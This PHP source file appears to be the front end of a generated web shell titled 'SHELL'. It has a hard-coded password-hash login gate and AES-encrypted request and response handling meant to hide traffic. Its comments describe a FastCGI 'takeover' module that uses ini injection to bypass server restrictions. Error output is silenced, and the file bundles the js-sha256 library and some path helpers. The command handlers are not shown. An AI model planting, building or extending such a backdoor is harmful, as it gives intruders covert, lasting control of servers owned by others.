<?php
/* Build: 5ab79e7a | SHA256: 5ab79e7aa648b978717f61b43d36a89d1ccd37fa1870cfdbf7b509a9762e5c47 | 2026-11-16T15:18:36Z */
error_reporting(0);
ini_set('display_errors', 0);
ob_start();



// Password gate — injected via templates/php.tpl; filled at build (shellsx/auth.py).
//
// Inner FastCGI requests (bypass.php takeover module) are detected and
// authenticated FIRST: they cannot carry a web session, so they present the
// build's own auth hash as a bearer token (never leaves this file; grants
// only the inner probe/trigger/ext modes, which require socket-level ini
// injection to do anything anyway). Valid inner requests skip session
// handling entirely — no session_start(), no Set-Cookie, no throwaway
// sess_* file per request, and no session headers leaking into the
// takeover's FastCGI stdout.
$__AUTH_HASH = 'ddc0621bacfbd7b1f9dcdc2287190d16cd4b078c2ac3b9f7af166cde15633cda';
$__login_failed = false;
$__authed_inner = (!empty($_SERVER['POC_ROLE'])
    && isset($_SERVER['POC_TOKEN'])
    && $__AUTH_HASH !== ''
    && hash_equals($__AUTH_HASH, $_SERVER['POC_TOKEN']));

if (!$__authed_inner) {
    session_start();
    if (isset($_POST['__auth_pass'])) {
        if (hash_equals($__AUTH_HASH, hash('sha256', $_POST['__auth_pass']))) {
            session_regenerate_id(true);
            $_SESSION['__authed'] = true;
            header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
            exit;
        }
        $__login_failed = true;
    }
    if (isset($_GET['logout'])) {
        session_destroy();
        ob_end_clean();
        header('Content-Type: text/html; charset=UTF-8');
        $___logout_to = strtok($_SERVER['REQUEST_URI'], '?') ?: '.';
        echo '<script>try{sessionStorage.removeItem("__enc_key")}catch(e){}location.replace('
            . json_encode($___logout_to) . ')</script>';
        exit;
    }
    if (empty($_SESSION['__authed'])) {
        ob_end_clean();
        header('Content-Type: text/html; charset=UTF-8');
        if ($__login_failed) {
            echo '<p class="login-error" role="alert">Wrong password</p>';
        }
        echo <<<'__SX_LOGIN__'
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Login</title>
  <style>
/* Login page — standalone (injected on auth gate; not bundled in shell.css). */
:root {
  --bg: #0d1117;
  --panel: #161b22;
  --border: #30363d;
  --text: #c9d1d9;
  --muted: #8b949e;
  --accent: #58a6ff;
  --accent-hover: #79b8ff;
  --red: #f85149;
}

.login-page {
  background: var(--bg);
  font-family: "Segoe UI", system-ui, sans-serif;
  min-height: 100vh;
}

.login-wrap {
  display: flex;
  align-items: center;
  justify-content: center;
  min-height: 100vh;
  padding: 24px;
}

.login-box {
  background: var(--panel);
  border: 1px solid var(--border);
  border-radius: 12px;
  padding: 32px;
  width: 100%;
  max-width: 340px;
}

.login-title {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  color: var(--accent);
  font-size: 16px;
  margin: 0 0 16px;
  text-align: center;
  letter-spacing: 1px;
}

.login-title .icon {
  width: 14px;
  height: 14px;
  fill: currentColor;
  flex-shrink: 0;
}

.login-form {
  display: flex;
  flex-direction: column;
  gap: 12px;
}

.login-error {
  margin: 0 0 12px;
  padding: 8px 10px;
  border-radius: 6px;
  border: 1px solid rgba(248, 81, 73, .45);
  background: rgba(248, 81, 73, .12);
  color: var(--red);
  font-size: 13px;
  text-align: center;
}

.login-field {
  width: 100%;
  background: var(--bg);
  border: 1px solid var(--border);
  border-radius: 6px;
  color: var(--text);
  padding: 8px 10px;
  font-size: 13px;
  outline: none;
  box-sizing: border-box;
}

.login-field:focus {
  border-color: var(--accent);
}

.login-submit {
  width: 100%;
  padding: 8px;
  border-radius: 6px;
  border: none;
  cursor: pointer;
  font-size: 13px;
  font-weight: 600;
  background: var(--accent);
  color: #000;
}

.login-submit:hover {
  background: var(--accent-hover);
}

.sr-only {
  position: absolute;
  width: 1px;
  height: 1px;
  padding: 0;
  margin: -1px;
  overflow: hidden;
  clip: rect(0, 0, 0, 0);
  white-space: nowrap;
  border: 0;
}

:root{--bg:#0f1414;--panel:#161c1c;--border:#2d3738;--text:#ccd5d5;--muted:#839595;--accent:#67e2e4;--purple:#8e8ce2;--accent-hover:#a7eeef;--accent-10:rgba(103,226,228,0.1)}
</style>
</head>
<body class="login-page">
  <main class="login-wrap">
    <section class="login-box">
      <h1 class="login-title">
        <svg class="icon" viewBox="0 0 16 16" aria-hidden="true"><path d="M1 2v12h14V2zm12 2v8H3V4zM5 6l1-1 3 3-3 3-1-1 2-2zm3 4h4v1H8z"/></svg>
        SHELL
      </h1>
      <form method="POST" class="login-form">
        <label class="sr-only" for="auth-password">Password</label>
        <input class="login-field" type="password" id="auth-password" name="__auth_pass" placeholder="Password" autocomplete="current-password" autofocus required>
        <button type="submit" class="login-submit">Authenticate</button>
      </form>
    </section>
  </main>
  <script>
/**
 * [js-sha256]{@link https://github.com/emn178/js-sha256}
 *
 * @version 0.11.0
 * @author Chen, Yi-Cyuan [emn178@gmail.com]
 * @copyright Chen, Yi-Cyuan 2014-2024
 * @license MIT
 */
/*jslint bitwise: true */
(function () {
  'use strict';

  var ERROR = 'input is invalid type';
  var WINDOW = typeof window === 'object';
  var root = WINDOW ? window : {};
  if (root.JS_SHA256_NO_WINDOW) {
    WINDOW = false;
  }
  var WEB_WORKER = !WINDOW && typeof self === 'object';
  var NODE_JS = !root.JS_SHA256_NO_NODE_JS && typeof process === 'object' && process.versions && process.versions.node;
  if (NODE_JS) {
    root = global;
  } else if (WEB_WORKER) {
    root = self;
  }
  var COMMON_JS = !root.JS_SHA256_NO_COMMON_JS && typeof module === 'object' && module.exports;
  var AMD = typeof define === 'function' && define.amd;
  var ARRAY_BUFFER = !root.JS_SHA256_NO_ARRAY_BUFFER && typeof ArrayBuffer !== 'undefined';
  var HEX_CHARS = '0123456789abcdef'.split('');
  var EXTRA = [-2147483648, 8388608, 32768, 128];
  var SHIFT = [24, 16, 8, 0];
  var K = [
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
  ];
  var OUTPUT_TYPES = ['hex', 'array', 'digest', 'arrayBuffer'];

  var blocks = [];

  if (root.JS_SHA256_NO_NODE_JS || !Array.isArray) {
    Array.isArray = function (obj) {
      return Object.prototype.toString.call(obj) === '[object Array]';
    };
  }

  if (ARRAY_BUFFER && (root.JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW || !ArrayBuffer.isView)) {
    ArrayBuffer.isView = function (obj) {
      return typeof obj === 'object' && obj.buffer && obj.buffer.constructor === ArrayBuffer;
    };
  }

  var createOutputMethod = function (outputType, is224) {
    return function (message) {
      return new Sha256(is224, true).update(message)[outputType]();
    };
  };

  var createMethod = function (is224) {
    var method = createOutputMethod('hex', is224);
    if (NODE_JS) {
      method = nodeWrap(method, is224);
    }
    method.create = function () {
      return new Sha256(is224);
    };
    method.update = function (message) {
      return method.create().update(message);
    };
    for (var i = 0; i < OUTPUT_TYPES.length; ++i) {
      var type = OUTPUT_TYPES[i];
      method[type] = createOutputMethod(type, is224);
    }
    return method;
  };

  var nodeWrap = function (method, is224) {
    var crypto = require('crypto')
    var Buffer = require('buffer').Buffer;
    var algorithm = is224 ? 'sha224' : 'sha256';
    var bufferFrom;
    if (Buffer.from && !root.JS_SHA256_NO_BUFFER_FROM) {
      bufferFrom = Buffer.from;
    } else {
      bufferFrom = function (message) {
        return new Buffer(message);
      };
    }
    var nodeMethod = function (message) {
      if (typeof message === 'string') {
        return crypto.createHash(algorithm).update(message, 'utf8').digest('hex');
      } else {
        if (message === null || message === undefined) {
          throw new Error(ERROR);
        } else if (message.constructor === ArrayBuffer) {
          message = new Uint8Array(message);
        }
      }
      if (Array.isArray(message) || ArrayBuffer.isView(message) ||
        message.constructor === Buffer) {
        return crypto.createHash(algorithm).update(bufferFrom(message)).digest('hex');
      } else {
        return method(message);
      }
    };
    return nodeMethod;
  };

  var createHmacOutputMethod = function (outputType, is224) {
    return function (key, message) {
      return new HmacSha256(key, is224, true).update(message)[outputType]();
    };
  };

  var createHmacMethod = function (is224) {
    var method = createHmacOutputMethod('hex', is224);
    method.create = function (key) {
      return new HmacSha256(key, is224);
    };
    method.update = function (key, message) {
      return method.create(key).update(message);
    };
    for (var i = 0; i < OUTPUT_TYPES.length; ++i) {
      var type = OUTPUT_TYPES[i];
      method[type] = createHmacOutputMethod(type, is224);
    }
    return method;
  };

  function Sha256(is224, sharedMemory) {
    if (sharedMemory) {
      blocks[0] = blocks[16] = blocks[1] = blocks[2] = blocks[3] =
        blocks[4] = blocks[5] = blocks[6] = blocks[7] =
        blocks[8] = blocks[9] = blocks[10] = blocks[11] =
        blocks[12] = blocks[13] = blocks[14] = blocks[15] = 0;
      this.blocks = blocks;
    } else {
      this.blocks = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
    }

    if (is224) {
      this.h0 = 0xc1059ed8;
      this.h1 = 0x367cd507;
      this.h2 = 0x3070dd17;
      this.h3 = 0xf70e5939;
      this.h4 = 0xffc00b31;
      this.h5 = 0x68581511;
      this.h6 = 0x64f98fa7;
      this.h7 = 0xbefa4fa4;
    } else { // 256
      this.h0 = 0x6a09e667;
      this.h1 = 0xbb67ae85;
      this.h2 = 0x3c6ef372;
      this.h3 = 0xa54ff53a;
      this.h4 = 0x510e527f;
      this.h5 = 0x9b05688c;
      this.h6 = 0x1f83d9ab;
      this.h7 = 0x5be0cd19;
    }

    this.block = this.start = this.bytes = this.hBytes = 0;
    this.finalized = this.hashed = false;
    this.first = true;
    this.is224 = is224;
  }

  Sha256.prototype.update = function (message) {
    if (this.finalized) {
      return;
    }
    var notString, type = typeof message;
    if (type !== 'string') {
      if (type === 'object') {
        if (message === null) {
          throw new Error(ERROR);
        } else if (ARRAY_BUFFER && message.constructor === ArrayBuffer) {
          message = new Uint8Array(message);
        } else if (!Array.isArray(message)) {
          if (!ARRAY_BUFFER || !ArrayBuffer.isView(message)) {
            throw new Error(ERROR);
          }
        }
      } else {
        throw new Error(ERROR);
      }
      notString = true;
    }
    var code, index = 0, i, length = message.length, blocks = this.blocks;
    while (index < length) {
      if (this.hashed) {
        this.hashed = false;
        blocks[0] = this.block;
        this.block = blocks[16] = blocks[1] = blocks[2] = blocks[3] =
          blocks[4] = blocks[5] = blocks[6] = blocks[7] =
          blocks[8] = blocks[9] = blocks[10] = blocks[11] =
          blocks[12] = blocks[13] = blocks[14] = blocks[15] = 0;
      }

      if (notString) {
        for (i = this.start; index < length && i < 64; ++index) {
          blocks[i >>> 2] |= message[index] << SHIFT[i++ & 3];
        }
      } else {
        for (i = this.start; index < length && i < 64; ++index) {
          code = message.charCodeAt(index);
          if (code < 0x80) {
            blocks[i >>> 2] |= code << SHIFT[i++ & 3];
          } else if (code < 0x800) {
            blocks[i >>> 2] |= (0xc0 | (code >>> 6)) << SHIFT[i++ & 3];
            blocks[i >>> 2] |= (0x80 | (code & 0x3f)) << SHIFT[i++ & 3];
          } else if (code < 0xd800 || code >= 0xe000) {
            blocks[i >>> 2] |= (0xe0 | (code >>> 12)) << SHIFT[i++ & 3];
            blocks[i >>> 2] |= (0x80 | ((code >>> 6) & 0x3f)) << SHIFT[i++ & 3];
            blocks[i >>> 2] |= (0x80 | (code & 0x3f)) << SHIFT[i++ & 3];
          } else {
            code = 0x10000 + (((code & 0x3ff) << 10) | (message.charCodeAt(++index) & 0x3ff));
            blocks[i >>> 2] |= (0xf0 | (code >>> 18)) << SHIFT[i++ & 3];
            blocks[i >>> 2] |= (0x80 | ((code >>> 12) & 0x3f)) << SHIFT[i++ & 3];
            blocks[i >>> 2] |= (0x80 | ((code >>> 6) & 0x3f)) << SHIFT[i++ & 3];
            blocks[i >>> 2] |= (0x80 | (code & 0x3f)) << SHIFT[i++ & 3];
          }
        }
      }

      this.lastByteIndex = i;
      this.bytes += i - this.start;
      if (i >= 64) {
        this.block = blocks[16];
        this.start = i - 64;
        this.hash();
        this.hashed = true;
      } else {
        this.start = i;
      }
    }
    if (this.bytes > 4294967295) {
      this.hBytes += this.bytes / 4294967296 << 0;
      this.bytes = this.bytes % 4294967296;
    }
    return this;
  };

  Sha256.prototype.finalize = function () {
    if (this.finalized) {
      return;
    }
    this.finalized = true;
    var blocks = this.blocks, i = this.lastByteIndex;
    blocks[16] = this.block;
    blocks[i >>> 2] |= EXTRA[i & 3];
    this.block = blocks[16];
    if (i >= 56) {
      if (!this.hashed) {
        this.hash();
      }
      blocks[0] = this.block;
      blocks[16] = blocks[1] = blocks[2] = blocks[3] =
        blocks[4] = blocks[5] = blocks[6] = blocks[7] =
        blocks[8] = blocks[9] = blocks[10] = blocks[11] =
        blocks[12] = blocks[13] = blocks[14] = blocks[15] = 0;
    }
    blocks[14] = this.hBytes << 3 | this.bytes >>> 29;
    blocks[15] = this.bytes << 3;
    this.hash();
  };

  Sha256.prototype.hash = function () {
    var a = this.h0, b = this.h1, c = this.h2, d = this.h3, e = this.h4, f = this.h5, g = this.h6,
      h = this.h7, blocks = this.blocks, j, s0, s1, maj, t1, t2, ch, ab, da, cd, bc;

    for (j = 16; j < 64; ++j) {
      // rightrotate
      t1 = blocks[j - 15];
      s0 = ((t1 >>> 7) | (t1 << 25)) ^ ((t1 >>> 18) | (t1 << 14)) ^ (t1 >>> 3);
      t1 = blocks[j - 2];
      s1 = ((t1 >>> 17) | (t1 << 15)) ^ ((t1 >>> 19) | (t1 << 13)) ^ (t1 >>> 10);
      blocks[j] = blocks[j - 16] + s0 + blocks[j - 7] + s1 << 0;
    }

    bc = b & c;
    for (j = 0; j < 64; j += 4) {
      if (this.first) {
        if (this.is224) {
          ab = 300032;
          t1 = blocks[0] - 1413257819;
          h = t1 - 150054599 << 0;
          d = t1 + 24177077 << 0;
        } else {
          ab = 704751109;
          t1 = blocks[0] - 210244248;
          h = t1 - 1521486534 << 0;
          d = t1 + 143694565 << 0;
        }
        this.first = false;
      } else {
        s0 = ((a >>> 2) | (a << 30)) ^ ((a >>> 13) | (a << 19)) ^ ((a >>> 22) | (a << 10));
        s1 = ((e >>> 6) | (e << 26)) ^ ((e >>> 11) | (e << 21)) ^ ((e >>> 25) | (e << 7));
        ab = a & b;
        maj = ab ^ (a & c) ^ bc;
        ch = (e & f) ^ (~e & g);
        t1 = h + s1 + ch + K[j] + blocks[j];
        t2 = s0 + maj;
        h = d + t1 << 0;
        d = t1 + t2 << 0;
      }
      s0 = ((d >>> 2) | (d << 30)) ^ ((d >>> 13) | (d << 19)) ^ ((d >>> 22) | (d << 10));
      s1 = ((h >>> 6) | (h << 26)) ^ ((h >>> 11) | (h << 21)) ^ ((h >>> 25) | (h << 7));
      da = d & a;
      maj = da ^ (d & b) ^ ab;
      ch = (h & e) ^ (~h & f);
      t1 = g + s1 + ch + K[j + 1] + blocks[j + 1];
      t2 = s0 + maj;
      g = c + t1 << 0;
      c = t1 + t2 << 0;
      s0 = ((c >>> 2) | (c << 30)) ^ ((c >>> 13) | (c << 19)) ^ ((c >>> 22) | (c << 10));
      s1 = ((g >>> 6) | (g << 26)) ^ ((g >>> 11) | (g << 21)) ^ ((g >>> 25) | (g << 7));
      cd = c & d;
      maj = cd ^ (c & a) ^ da;
      ch = (g & h) ^ (~g & e);
      t1 = f + s1 + ch + K[j + 2] + blocks[j + 2];
      t2 = s0 + maj;
      f = b + t1 << 0;
      b = t1 + t2 << 0;
      s0 = ((b >>> 2) | (b << 30)) ^ ((b >>> 13) | (b << 19)) ^ ((b >>> 22) | (b << 10));
      s1 = ((f >>> 6) | (f << 26)) ^ ((f >>> 11) | (f << 21)) ^ ((f >>> 25) | (f << 7));
      bc = b & c;
      maj = bc ^ (b & d) ^ cd;
      ch = (f & g) ^ (~f & h);
      t1 = e + s1 + ch + K[j + 3] + blocks[j + 3];
      t2 = s0 + maj;
      e = a + t1 << 0;
      a = t1 + t2 << 0;
      this.chromeBugWorkAround = true;
    }

    this.h0 = this.h0 + a << 0;
    this.h1 = this.h1 + b << 0;
    this.h2 = this.h2 + c << 0;
    this.h3 = this.h3 + d << 0;
    this.h4 = this.h4 + e << 0;
    this.h5 = this.h5 + f << 0;
    this.h6 = this.h6 + g << 0;
    this.h7 = this.h7 + h << 0;
  };

  Sha256.prototype.hex = function () {
    this.finalize();

    var h0 = this.h0, h1 = this.h1, h2 = this.h2, h3 = this.h3, h4 = this.h4, h5 = this.h5,
      h6 = this.h6, h7 = this.h7;

    var hex = HEX_CHARS[(h0 >>> 28) & 0x0F] + HEX_CHARS[(h0 >>> 24) & 0x0F] +
      HEX_CHARS[(h0 >>> 20) & 0x0F] + HEX_CHARS[(h0 >>> 16) & 0x0F] +
      HEX_CHARS[(h0 >>> 12) & 0x0F] + HEX_CHARS[(h0 >>> 8) & 0x0F] +
      HEX_CHARS[(h0 >>> 4) & 0x0F] + HEX_CHARS[h0 & 0x0F] +
      HEX_CHARS[(h1 >>> 28) & 0x0F] + HEX_CHARS[(h1 >>> 24) & 0x0F] +
      HEX_CHARS[(h1 >>> 20) & 0x0F] + HEX_CHARS[(h1 >>> 16) & 0x0F] +
      HEX_CHARS[(h1 >>> 12) & 0x0F] + HEX_CHARS[(h1 >>> 8) & 0x0F] +
      HEX_CHARS[(h1 >>> 4) & 0x0F] + HEX_CHARS[h1 & 0x0F] +
      HEX_CHARS[(h2 >>> 28) & 0x0F] + HEX_CHARS[(h2 >>> 24) & 0x0F] +
      HEX_CHARS[(h2 >>> 20) & 0x0F] + HEX_CHARS[(h2 >>> 16) & 0x0F] +
      HEX_CHARS[(h2 >>> 12) & 0x0F] + HEX_CHARS[(h2 >>> 8) & 0x0F] +
      HEX_CHARS[(h2 >>> 4) & 0x0F] + HEX_CHARS[h2 & 0x0F] +
      HEX_CHARS[(h3 >>> 28) & 0x0F] + HEX_CHARS[(h3 >>> 24) & 0x0F] +
      HEX_CHARS[(h3 >>> 20) & 0x0F] + HEX_CHARS[(h3 >>> 16) & 0x0F] +
      HEX_CHARS[(h3 >>> 12) & 0x0F] + HEX_CHARS[(h3 >>> 8) & 0x0F] +
      HEX_CHARS[(h3 >>> 4) & 0x0F] + HEX_CHARS[h3 & 0x0F] +
      HEX_CHARS[(h4 >>> 28) & 0x0F] + HEX_CHARS[(h4 >>> 24) & 0x0F] +
      HEX_CHARS[(h4 >>> 20) & 0x0F] + HEX_CHARS[(h4 >>> 16) & 0x0F] +
      HEX_CHARS[(h4 >>> 12) & 0x0F] + HEX_CHARS[(h4 >>> 8) & 0x0F] +
      HEX_CHARS[(h4 >>> 4) & 0x0F] + HEX_CHARS[h4 & 0x0F] +
      HEX_CHARS[(h5 >>> 28) & 0x0F] + HEX_CHARS[(h5 >>> 24) & 0x0F] +
      HEX_CHARS[(h5 >>> 20) & 0x0F] + HEX_CHARS[(h5 >>> 16) & 0x0F] +
      HEX_CHARS[(h5 >>> 12) & 0x0F] + HEX_CHARS[(h5 >>> 8) & 0x0F] +
      HEX_CHARS[(h5 >>> 4) & 0x0F] + HEX_CHARS[h5 & 0x0F] +
      HEX_CHARS[(h6 >>> 28) & 0x0F] + HEX_CHARS[(h6 >>> 24) & 0x0F] +
      HEX_CHARS[(h6 >>> 20) & 0x0F] + HEX_CHARS[(h6 >>> 16) & 0x0F] +
      HEX_CHARS[(h6 >>> 12) & 0x0F] + HEX_CHARS[(h6 >>> 8) & 0x0F] +
      HEX_CHARS[(h6 >>> 4) & 0x0F] + HEX_CHARS[h6 & 0x0F];
    if (!this.is224) {
      hex += HEX_CHARS[(h7 >>> 28) & 0x0F] + HEX_CHARS[(h7 >>> 24) & 0x0F] +
        HEX_CHARS[(h7 >>> 20) & 0x0F] + HEX_CHARS[(h7 >>> 16) & 0x0F] +
        HEX_CHARS[(h7 >>> 12) & 0x0F] + HEX_CHARS[(h7 >>> 8) & 0x0F] +
        HEX_CHARS[(h7 >>> 4) & 0x0F] + HEX_CHARS[h7 & 0x0F];
    }
    return hex;
  };

  Sha256.prototype.toString = Sha256.prototype.hex;

  Sha256.prototype.digest = function () {
    this.finalize();

    var h0 = this.h0, h1 = this.h1, h2 = this.h2, h3 = this.h3, h4 = this.h4, h5 = this.h5,
      h6 = this.h6, h7 = this.h7;

    var arr = [
      (h0 >>> 24) & 0xFF, (h0 >>> 16) & 0xFF, (h0 >>> 8) & 0xFF, h0 & 0xFF,
      (h1 >>> 24) & 0xFF, (h1 >>> 16) & 0xFF, (h1 >>> 8) & 0xFF, h1 & 0xFF,
      (h2 >>> 24) & 0xFF, (h2 >>> 16) & 0xFF, (h2 >>> 8) & 0xFF, h2 & 0xFF,
      (h3 >>> 24) & 0xFF, (h3 >>> 16) & 0xFF, (h3 >>> 8) & 0xFF, h3 & 0xFF,
      (h4 >>> 24) & 0xFF, (h4 >>> 16) & 0xFF, (h4 >>> 8) & 0xFF, h4 & 0xFF,
      (h5 >>> 24) & 0xFF, (h5 >>> 16) & 0xFF, (h5 >>> 8) & 0xFF, h5 & 0xFF,
      (h6 >>> 24) & 0xFF, (h6 >>> 16) & 0xFF, (h6 >>> 8) & 0xFF, h6 & 0xFF
    ];
    if (!this.is224) {
      arr.push((h7 >>> 24) & 0xFF, (h7 >>> 16) & 0xFF, (h7 >>> 8) & 0xFF, h7 & 0xFF);
    }
    return arr;
  };

  Sha256.prototype.array = Sha256.prototype.digest;

  Sha256.prototype.arrayBuffer = function () {
    this.finalize();

    var buffer = new ArrayBuffer(this.is224 ? 28 : 32);
    var dataView = new DataView(buffer);
    dataView.setUint32(0, this.h0);
    dataView.setUint32(4, this.h1);
    dataView.setUint32(8, this.h2);
    dataView.setUint32(12, this.h3);
    dataView.setUint32(16, this.h4);
    dataView.setUint32(20, this.h5);
    dataView.setUint32(24, this.h6);
    if (!this.is224) {
      dataView.setUint32(28, this.h7);
    }
    return buffer;
  };

  function HmacSha256(key, is224, sharedMemory) {
    var i, type = typeof key;
    if (type === 'string') {
      var bytes = [], length = key.length, index = 0, code;
      for (i = 0; i < length; ++i) {
        code = key.charCodeAt(i);
        if (code < 0x80) {
          bytes[index++] = code;
        } else if (code < 0x800) {
          bytes[index++] = (0xc0 | (code >>> 6));
          bytes[index++] = (0x80 | (code & 0x3f));
        } else if (code < 0xd800 || code >= 0xe000) {
          bytes[index++] = (0xe0 | (code >>> 12));
          bytes[index++] = (0x80 | ((code >>> 6) & 0x3f));
          bytes[index++] = (0x80 | (code & 0x3f));
        } else {
          code = 0x10000 + (((code & 0x3ff) << 10) | (key.charCodeAt(++i) & 0x3ff));
          bytes[index++] = (0xf0 | (code >>> 18));
          bytes[index++] = (0x80 | ((code >>> 12) & 0x3f));
          bytes[index++] = (0x80 | ((code >>> 6) & 0x3f));
          bytes[index++] = (0x80 | (code & 0x3f));
        }
      }
      key = bytes;
    } else {
      if (type === 'object') {
        if (key === null) {
          throw new Error(ERROR);
        } else if (ARRAY_BUFFER && key.constructor === ArrayBuffer) {
          key = new Uint8Array(key);
        } else if (!Array.isArray(key)) {
          if (!ARRAY_BUFFER || !ArrayBuffer.isView(key)) {
            throw new Error(ERROR);
          }
        }
      } else {
        throw new Error(ERROR);
      }
    }

    if (key.length > 64) {
      key = (new Sha256(is224, true)).update(key).array();
    }

    var oKeyPad = [], iKeyPad = [];
    for (i = 0; i < 64; ++i) {
      var b = key[i] || 0;
      oKeyPad[i] = 0x5c ^ b;
      iKeyPad[i] = 0x36 ^ b;
    }

    Sha256.call(this, is224, sharedMemory);

    this.update(iKeyPad);
    this.oKeyPad = oKeyPad;
    this.inner = true;
    this.sharedMemory = sharedMemory;
  }
  HmacSha256.prototype = new Sha256();

  HmacSha256.prototype.finalize = function () {
    Sha256.prototype.finalize.call(this);
    if (this.inner) {
      this.inner = false;
      var innerHash = this.array();
      Sha256.call(this, this.is224, this.sharedMemory);
      this.update(this.oKeyPad);
      this.update(innerHash);
      Sha256.prototype.finalize.call(this);
    }
  };

  var exports = createMethod();
  exports.sha256 = exports;
  exports.sha224 = createMethod(true);
  exports.sha256.hmac = createHmacMethod();
  exports.sha224.hmac = createHmacMethod(true);

  if (COMMON_JS) {
    module.exports = exports;
  } else {
    root.sha256 = exports.sha256;
    root.sha224 = exports.sha224;
    if (AMD) {
      define(function () {
        return exports;
      });
    }
  }
})();

</script>
  <script>
  document.querySelector('.login-form').addEventListener('submit', function(e) {
    e.preventDefault();
    var f = this, pw = f.__auth_pass.value;
    if (!pw) { f.submit(); return; }
    if (typeof sha256 !== 'function') {
      alert('Crypto library missing from build.');
      return;
    }
    sessionStorage.setItem('__enc_key', sha256(pw));
    f.submit();
  });
  </script>
</body>
</html>

__SX_LOGIN__;
        exit;
    }
}

// Crypto middleware — decrypts incoming requests and encrypts responses when encryption is active.
// Uses AES-256-CBC with random IV. Key = hex2bin($__AUTH_HASH) = SHA256(password) = 32 bytes.
// Sacrificial buffer pattern: template's ob_start is cleaned, then encryption buffer + sacrificial
// buffer are stacked. Handlers' ob_end_clean() destroys the sacrificial buffer; the encryption
// buffer survives and encrypts output on exit/flush.

// Reject cleartext API bodies before decrypt (must run while __enc is still present).
if (isset($__AUTH_HASH) && $_SERVER['REQUEST_METHOD'] === 'POST'
    && isset($_POST['action']) && !isset($_POST['__enc'])) {
    while (ob_get_level())
        ob_end_clean();
    header('Content-Type: application/json');
    echo json_encode(['error' => 'Encryption required']);
    exit;
}

if (isset($_POST['__enc']) && isset($__AUTH_HASH) && function_exists('openssl_decrypt')) {
    $__CRYPTO_KEY = hex2bin($__AUTH_HASH);
    $raw = base64_decode($_POST['__enc'], true);
    if ($raw === false || strlen($raw) < 17) {
        ob_end_clean();
        header('Content-Type: application/json');
        echo json_encode(['error' => 'Invalid encrypted payload']);
        exit;
    }
    $iv = substr($raw, 0, 16);
    $ciphertext = substr($raw, 16);
    $decrypted = openssl_decrypt($ciphertext, 'AES-256-CBC', $__CRYPTO_KEY, OPENSSL_RAW_DATA, $iv);
    if ($decrypted === false) {
        ob_end_clean();
        header('Content-Type: application/json');
        echo json_encode(['error' => 'Decryption failed']);
        exit;
    }
    parse_str($decrypted, $__dec_params);
    $_POST = array_merge($_POST, $__dec_params);
    unset($_POST['__enc']);

    // Clean template's ob_start
    while (ob_get_level())
        ob_end_clean();

    // Encryption output buffer — callback encrypts everything on flush
    ob_start(function ($buffer) use ($__CRYPTO_KEY) {
        if (strlen($buffer) === 0)
            return '';
        $iv = random_bytes(16);
        $enc = openssl_encrypt($buffer, 'AES-256-CBC', $__CRYPTO_KEY, OPENSSL_RAW_DATA, $iv);
        return base64_encode($iv . $enc);
    });

    // Sacrificial buffer — handlers' ob_end_clean() will destroy this one, not the encryption buffer
    ob_start();
}

// Encrypted POST but OpenSSL missing/disabled — fail closed instead of falling through to HTML UI.
if (isset($_POST['__enc']) && isset($__AUTH_HASH) && !function_exists('openssl_decrypt')) {
    while (ob_get_level())
        ob_end_clean();
    header('Content-Type: application/json');
    echo json_encode(['error' => 'OpenSSL not available on server (openssl_decrypt missing)']);
    exit;
}
// Shared PHP helper utilities for backend modules.
//
// These helpers centralize canonical path handling, session save path
// normalization, and file access restrictions for diagnostics, download,
// and other backend endpoints.

function shells_x_realpath(string $path): array {
    if ($path === '')
        return ['error' => 'path is empty'];
    $real = realpath($path);
    if ($real === false)
        return ['error' => "path does not exist or is not accessible: $path"];
    return ['path' => $real];
}

function shells_x_parse_session_save_path(string $savePath): array {
    if ($savePath === '')
        return ['path' => sys_get_temp_dir()];

    // session.save_path can be in the form "N;/path" when using user-level
    if (preg_match('/^\d+;(.*)$/', $savePath, $matches))
        $savePath = $matches[1];

    // session.save_path can also be a file:// URL if using a custom session handler (very rare).
    $parsed = parse_url($savePath);
    if ($parsed === false)
        return ['error' => "failed to parse session save path: $savePath"];

    if (isset($parsed['scheme'])) {
        $scheme = strtolower($parsed['scheme']);
        if ($scheme !== 'file')
            return ['error' => "unsupported session save path scheme: $scheme"];
        $savePath = $parsed['path'] ?? '';
    }

    $savePath = rtrim($savePath, '/');
    if ($savePath === '')
        return ['error' => 'session save path resolved to empty string'];

    return ['path' => $savePath];
}

function shells_x_path_within(string $path, string $base): bool {
    $path = rtrim($path, '/');
    $base = rtrim($base, '/');
    if ($base === '')
        return false;
    return $path === $base || strpos($path, $base . '/') === 0;
}

function shells_x_is_path_allowed(string $path, array $allowedRoots): bool {
    foreach ($allowedRoots as $root) {
        if (!is_string($root) || $root === '')
            continue;
        if (shells_x_path_within($path, $root))
            return true;
    }
    return false;
}

function shells_x_validate_readable_file(string $path): array {
    $result = shells_x_realpath($path);
    if (isset($result['error']))
        return $result;
    $real = $result['path'];
    if (!is_file($real))
        return ['error' => "not a regular file: $real"];
    if (!is_readable($real))
        return ['error' => "file is not readable: $real"];
    return ['path' => $real];
}

